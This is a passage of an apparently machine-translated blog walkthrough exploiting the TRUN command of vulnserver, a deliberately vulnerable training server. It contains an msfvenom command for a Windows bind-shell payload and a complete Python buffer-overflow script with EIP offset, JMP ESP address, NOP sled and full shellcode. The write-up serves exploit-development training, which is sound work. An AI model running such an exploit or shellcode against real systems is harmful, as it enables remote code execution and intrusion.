class="ok ol di om bf on"><div class="gh gi pq"><img src="../Images/30cd0c6764083814784bf96da10df478.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*teREt3Bg2PFOph4lb4S2uQ.png"/></div></div></figure></div><div class="ab cl mr ms hu mt" role="separator"><span class="mu bw bk mv mw mx"/><span class="mu bw bk mv mw mx"/><span class="mu bw bk mv mw"/></div><div class="ij ik il im in"><h2 id="be7a" class="nl jv iq bd jw nr ns dn ka nt nu dp ke ld nv nw ki lh nx ny km ll nz oa kq ob bi translated">MSF毒液结合壳</h2><p id="113a" class="pw-post-body-paragraph ks kt iq ku b kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp ij bi translated">现在我们有大约2000+的自由空间来放置我们的外壳代码。引入bind shell的空间会很大。让我们使用<code class="fe lq lr ls lt b">msfvenom</code>来创建我们的外壳代码。</p><pre class="nd ne nf ng gt nh lt ni nj aw nk bi"><span id="9e67" class="nl jv iq lt b gy nm nn l no np"><strong class="lt ir">### msfvenom Bind Shell</strong><br/>$ msfvenom -p windows/shell_bind_tcp LPORT=443 -b '\x00' EXITFUNC=thread -f python</span><span id="1caf" class="nl jv iq lt b gy oc nn l no np"><em class="ou">(*I used a x86 Kali Linux to create the shellcode)</em></span></pre><figure class="nd ne nf ng gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ok ol di om bf on"><div class="gh gi pr"><img src="../Images/73e240d6f305489e94b2c30509eafcb2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fD1IdY6b5Zl5zY0_ISckkw.png"/></div></div><figcaption class="oe of gj gh gi og oh bd b be z dk translated">msfvenom外壳代码</figcaption></figure></div><div class="ab cl mr ms hu mt" role="separator"><span class="mu bw bk mv mw mx"/><span class="mu bw bk mv mw mx"/><span class="mu bw bk mv mw"/></div><div class="ij ik il im in"><h2 id="6e7f" class="nl jv iq bd jw nr ns dn ka nt nu dp ke ld nv nw ki lh nx ny km ll nz oa kq ob bi translated">最终利用</h2><p id="0400" class="pw-post-body-paragraph ks kt iq ku b kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp ij bi translated">让我们用创建的外壳代码来完成我们的PoC脚本。此外，在外壳代码前添加一些no sled(<code class="fe lq lr ls lt b">\x90</code>)，以便我们的外壳代码可以正确地添加到堆栈中。</p><pre class="nd ne nf ng gt nh lt ni nj aw nk bi"><span id="d094" class="nl jv iq lt b gy nm nn l no np"><strong class="lt ir">### </strong><a class="ae mn" href="https://github.com/bigb0sss/OSCE/blob/master/vulnserver/TRUN/final_trun.py" rel="noopener ugc nofollow" target="_blank"><strong class="lt ir">Final_trun.py</strong></a></span><span id="6e0a" class="nl jv iq lt b gy oc nn l no np">import socket<br/>import struct<br/>import os<br/>import sys</span><span id="6ce1" class="nl jv iq lt b gy oc nn l no np">trun = "TRUN ."<br/>offset = 2006<br/>eip = struct.pack("&lt;I", 0x62501205)                <strong class="lt ir"> # JMP ESP</strong><br/>nop = "\x90" * 50                                   <strong class="lt ir"># Nopsled </strong></span><span id="3e19" class="nl jv iq lt b gy oc nn l no np">buf =  ""<br/>buf += "\xda\xc8\xb8\xaa\xa0\x38\x73\xd9\x74\x24\xf4\x5a\x2b"<br/>buf += "\xc9\xb1\x53\x31\x42\x17\x83\xc2\x04\x03\xe8\xb3\xda"<br/>buf += "\x86\x10\x5b\x98\x69\xe8\x9c\xfd\xe0\x0d\xad\x3d\x96"<br/>buf += "\x46\x9e\x8d\xdc\x0a\x13\x65\xb0\xbe\xa0\x0b\x1d\xb1"<br/>buf += "\x01\xa1\x7b\xfc\x92\x9a\xb8\x9f\x10\xe1\xec\x7f\x28"<br/>buf += "\x2a\xe1\x7e\x6d\x57\x08\xd2\x26\x13\xbf\xc2\x43\x69"<br/>buf += "\x7c\x69\x1f\x7f\x04\x8e\xe8\x7e\x25\x01\x62\xd9\xe5"<br/>buf += "\xa0\xa7\x51\xac\xba\xa4\x5c\x66\x31\x1e\x2a\x79\x93"<br/>buf += "\x6e\xd3\xd6\xda\x5e\x26\x26\x1b\x58\xd9\x5d\x55\x9a"<br/>buf += "\x64\x66\xa2\xe0\xb2\xe3\x30\x42\x30\x53\x9c\x72\x95"<br/>buf += "\x02\x57\x78\x52\x40\x3f\x9d\x65\x85\x34\x99\xee\x28"<br/>buf += "\x9a\x2b\xb4\x0e\x3e\x77\x6e\x2e\x67\xdd\xc1\x4f\x77"<br/>buf += "\xbe\xbe\xf5\xfc\x53\xaa\x87\x5f\x3c\x1f\xaa\x5f\xbc"<br/>buf += "\x37\xbd\x2c\x8e\x98\x15\xba\xa2\x51\xb0\x3d\xc4\x4b"<br/>buf += "\x04\xd1\x3b\x74\x75\xf8\xff\x20\x25\x92\xd6\x48\xae"<br/>buf += "\x62\xd6\x9c\x5b\x6a\x71\x4f\x7e\x97\xc1\x3f\x3e\x37"<br/>buf += "\xaa\x55\xb1\x68\xca\x55\x1b\x01\x63\xa8\xa4\x2c\xcf"<br/>buf += "\x25\x42\x44\x3f\x60\xdc\xf0\xfd\x57\xd5\x67\xfd\xbd"<br/>buf += "\x4d\x0f\xb6\xd7\x4a\x30\x47\xf2\xfc\xa6\xcc\x11\x39"<br/>buf += "\xd7\xd2\x3f\x69\x80\x45\xb5\xf8\xe3\xf4\xca\xd0\x93"<br/>buf += "\x95\x59\xbf\x63\xd3\x41\x68\x34\xb4\xb4\x61\xd0\x28"<br/>buf += "\xee\xdb\xc6\xb0\x76\x23\x42\x6f\x4b\xaa\x4b\xe2\xf7"<br/>buf += "\x88\x5b\x3a\xf7\x94\x0f\x92\xae\x42\xf9\x54\x19\x25"<br/>buf += "\x53\x0f\xf6\xef\x33\xd6\x34\x30\x45\xd7\x10\xc6\xa9"<br/>buf += "\x66\xcd\x9f\xd6\x47\x99\x17\xaf\xb5\x39\xd7\x7a\x7e"<br/>buf += "\x59\x3a\xae\x8b\xf2\xe3\x3b\x36\x9f\x13\x96\x75\xa6"<br/>buf += "\x97\x12\x06\x5d\x87\x57\x03\x19\x0f\x84\x79\x32\xfa"<br/>buf += "\xaa\x2e\x33\x2f"</span><span id="a026" class="nl jv iq lt b gy oc nn l no np">payload = ""<br/>payload += trun<br/>payload += "A" * offset<br/>payload += eip<br/>payload += nop<br/>payload += buf<br/>payload += "C" * (4099 - offset - len(eip) - len(nop) - len(buf))</span><span id="301d" class="nl jv iq lt b gy oc nn l no np">print "[+] Sending buffer (Size: %d)" % len(payload)</span><span id="e02b" class="nl jv iq lt b gy oc nn l no np">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br/>s.connect(('127.0.0.1', 9999))<br/>print(s.recv(1024))<br/>s.send(payload)    <br/>s.close()</span></pre><p id="19a8" class="pw-post-body-paragraph ks kt iq ku b kv mi kx ky kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp ij bi translated">一旦我们运行了<code class="fe lq lr ls lt b">final_trun.py</code>脚本，我们就可以成功地在目标系统上打开bind shell。</p><figure class="nd ne nf ng gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ok ol di om bf on"><div class="gh gi ps"><img src="../Images/d39ac2efc381ad0d01b22994869a7805.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*G3frQGF68Zn7wiLxN0V3tQ.png"/></div></div></figure></div><div class="ab cl mr ms hu mt" role="separator"><span class="mu bw bk mv mw mx"/><span class="mu bw bk mv mw mx"/><span class="mu bw bk mv mw"/></div><div class="ij ik il im in"><h1 id="54d2" class="ju jv iq bd jw jx my jz ka kb mz kd ke kf na kh ki kj nb kl km kn nc kp kq kr bi translated">结论</h1><p id="fc5a" class="pw-post-body-paragraph ks kt iq ku b kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp ij bi translated">概括一下:</p><ul class=""><li id="9a29" class="lu lv iq ku b kv mi kz mj ld mo lh mp ll mq lp lz ma mb mc bi translated">我们模糊了<code class="fe lq lr ls lt b">vulnserver</code> <code class="fe lq lr ls lt b">TRUN</code>命令</li><li id="c3e6" class="lu lv iq ku b kv md kz me ld mf lh mg ll mh lp lz ma mb mc bi translated">找到了有漏洞命令的入口点</li><li id="47aa" class="lu lv iq ku b kv md kz me ld mf lh mg ll mh lp lz ma mb mc bi translated">找到了控制<code class="fe lq lr ls lt b">EIP</code>的偏移量</li><li id="6c6c" class="lu lv iq ku b kv md kz me ld mf lh mg ll mh lp lz ma mb mc bi translated">在应用程序的dll中找到了<code class="fe lq lr ls lt b">JMP ESP</code></li><li id="e729" class="lu lv iq ku b kv md kz me ld mf lh mg ll mh lp lz ma mb mc bi translated">引入了绑定外壳代码来完成利用。</li></ul><p id="d500" class="pw-post-body-paragraph ks kt iq ku b kv mi kx ky kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp ij bi translated">这是有趣的第一个<code class="fe lq lr ls lt b">vulnserver</code> fuzzing + exploit。感谢阅读！</p><figure class="nd ne nf ng gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ok ol di om bf on"><div class="gh gi pt"><img src="../Images/f6dd77a75e013afc9e1581cf28ae9093.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*bd6Lbdc5g8bPUQps.png"/></div></div></figure></div></div>    
</body>
</html>